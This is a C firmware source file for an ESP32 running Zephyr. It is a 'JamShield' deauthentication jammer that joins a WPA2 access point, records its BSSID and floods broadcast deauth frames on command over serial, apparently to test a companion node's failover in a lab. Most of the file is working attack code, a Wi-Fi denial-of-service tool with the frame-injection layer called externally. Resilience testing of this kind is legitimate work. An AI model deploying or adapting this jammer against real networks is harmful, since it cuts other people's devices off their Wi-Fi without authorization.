/*
 * JamShield jammer (ESP32 #2) — associate-then-inject deauth jammer.
 *
 * Joins the same AP as the victim node (so the WiFi driver is in its stable,
 * associated state and already on the AP's channel), learns the AP's BSSID, and
 * floods broadcast deauthentication frames while "jamming" is on. This kicks
 * the victim node off WPA2 (no-PMF) WiFi, triggering its real failover.
 *
 * Serial (USB):  s = start jamming,  x = stop,  ? = status.
 * Authorized educational/lab use on your OWN network only.
 */
#include <zephyr/kernel.h>
#include <zephyr/device.h>
#include <zephyr/drivers/uart.h>
#include <zephyr/net/net_if.h>
#include <zephyr/net/net_mgmt.h>
#include <zephyr/net/wifi_mgmt.h>
#include <zephyr/logging/log.h>

#include "jamshield.h"   /* JS_WIFI_SSID / JS_WIFI_PSK (shared with the node) */

LOG_MODULE_REGISTER(jammer, LOG_LEVEL_INF);

extern void jam_hal_set_bssid(const uint8_t *bssid);
extern int jam_hal_burst(int count);

#define BURST          64
#define RETRY_MS       6000

static struct net_if *wifi_iface;
static volatile bool associated;
static volatile bool want_jam;   /* set by 's' (RF on), cleared by 'x' (RF off) */
static struct net_mgmt_event_callback wifi_cb;
static const struct device *const console_dev =
	DEVICE_DT_GET(DT_CHOSEN(zephyr_console));

#define WIFI_EVENTS (NET_EVENT_WIFI_CONNECT_RESULT | NET_EVENT_WIFI_DISCONNECT_RESULT)

static void wifi_evt(struct net_mgmt_event_callback *cb, uint32_t event,
		     struct net_if *iface)
{
	ARG_UNUSED(iface);

	if (event == NET_EVENT_WIFI_CONNECT_RESULT) {
		const struct wifi_status *st = (const struct wifi_status *)cb->info;

		if (st && st->status) {
			printk("JAM: assoc failed (%d)\n", st->status);
			return;
		}
		struct wifi_iface_status s = {0};

		if (net_mgmt(NET_REQUEST_WIFI_IFACE_STATUS, wifi_iface, &s,
			     sizeof(s)) == 0) {
			jam_hal_set_bssid(s.bssid);
			printk("JAM: associated to %s, AP %02x:%02x:%02x:%02x:%02x:%02x ch%d\n",
			       JS_WIFI_SSID, s.bssid[0], s.bssid[1], s.bssid[2],
			       s.bssid[3], s.bssid[4], s.bssid[5], s.channel);
		}
		associated = true;
	} else if (event == NET_EVENT_WIFI_DISCONNECT_RESULT) {
		associated = false;
		printk("JAM: disassociated\n");
	}
}

static void do_connect(void)
{
	static struct wifi_connect_req_params p;

	if (!net_if_is_admin_up(wifi_iface)) {
		(void)net_if_up(wifi_iface);
	}

	p.ssid = (const uint8_t *)JS_WIFI_SSID;
	p.ssid_length = sizeof(JS_WIFI_SSID) - 1;
	p.psk = (const uint8_t *)JS_WIFI_PSK;
	p.psk_length = sizeof(JS_WIFI_PSK) - 1;
	p.security = WIFI_SECURITY_TYPE_PSK;
	p.channel = WIFI_CHANNEL_ANY;
	p.band = WIFI_FREQ_BAND_2_4_GHZ;
	p.mfp = WIFI_MFP_OPTIONAL;

	int r = net_mgmt(NET_REQUEST_WIFI_CONNECT, wifi_iface, &p, sizeof(p));

	if (r) {
		printk("JAM: connect req = %d\n", r);
	}
}

static void serial_thread(void *p1, void *p2, void *p3)
{
	ARG_UNUSED(p1); ARG_UNUSED(p2); ARG_UNUSED(p3);
	uint8_t ch;

	while (1) {
		while (uart_poll_in(console_dev, &ch) == 0) {
			if (ch == 's' || ch == 'S') {
				want_jam = true;
				printk("JAM: RF ON (associate + deauth)\n");
			} else if (ch == 'x' || ch == 'X') {
				want_jam = false;
				printk("JAM: RF OFF (disconnect)\n");
			} else if (ch == '?') {
				printk("JAM: assoc=%d want_jam=%d\n", associated,
				       want_jam);
			}
		}
		k_msleep(30);
	}
}
K_THREAD_DEFINE(serial_tid, 1024, serial_thread, NULL, NULL, NULL, 7, 0, 0);

int main(void)
{
	printk("==== JamShield JAMMER (deauth) starting ====\n");

	wifi_iface = net_if_get_first_wifi();
	if (!wifi_iface) {
		printk("JAM: no WiFi iface\n");
		return 0;
	}

	net_mgmt_init_event_callback(&wifi_cb, wifi_evt, WIFI_EVENTS);
	net_mgmt_add_event_callback(&wifi_cb);

	printk("JAM: idle; send 's' to start RF deauth (it stays off WiFi until then)\n");

	uint64_t last_try = 0;
	uint32_t total = 0;

	while (1) {
		if (want_jam) {
			/* RF requested: associate to the victim AP, then flood. */
			if (!associated) {
				if (last_try == 0 ||
				    k_uptime_get() - last_try > RETRY_MS) {
					last_try = k_uptime_get();
					do_connect();
				}
				k_msleep(200);
			} else {
				int ret = jam_hal_burst(BURST);

				total += BURST;
				if (total % (BURST * 40U) == 0U) {
					printk("JAM: deauth total=%u last=%d\n",
					       total, ret);
				}
				/* Sleep (not just yield) so the lower-priority serial
				 * thread runs to process 'x'. Still ~25k frames/s. */
				k_msleep(2);
			}
		} else {
			/* Idle: stay OFF WiFi so we don't disrupt the victim node. */
			if (associated) {
				(void)net_mgmt(NET_REQUEST_WIFI_DISCONNECT,
					       wifi_iface, NULL, 0);
				printk("JAM: disconnected (idle)\n");
			}
			last_try = 0;
			k_msleep(150);
		}
	}
	return 0;
}
